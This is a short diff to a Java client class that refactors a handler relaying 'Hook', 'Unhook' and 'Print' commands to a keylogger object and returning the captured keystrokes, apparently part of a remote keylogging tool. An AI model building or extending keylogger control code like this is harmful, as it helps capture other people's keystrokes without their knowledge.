@@ -55,26 +55,17 @@ public class Client
 
     public String handleKeyLogger(String command)
     {
-        try
+        sendCommand(command);
+        switch(command)
         {
-            byte[] msg = command.getBytes();
-            outputStream.write(msg);
-
-            switch(command)
-            {
-                case "Hook":
-                    keylogger.handleHook();
-                    break;
-                case "Unhook":
-                    keylogger.handleUnHook();
-                    break;
-                case "Print":
-                    return keylogger.handlePrint();
-            }
-        }
-        catch (IOException ioE)
-        {
-            ioE.printStackTrace();
+            case "Hook":
+                keylogger.handleHook();
+                break;
+            case "Unhook":
+                keylogger.handleUnHook();
+                break;
+            case "Print":
+                return keylogger.handlePrint();
         }
 
         return keylogger.getKeylogging();
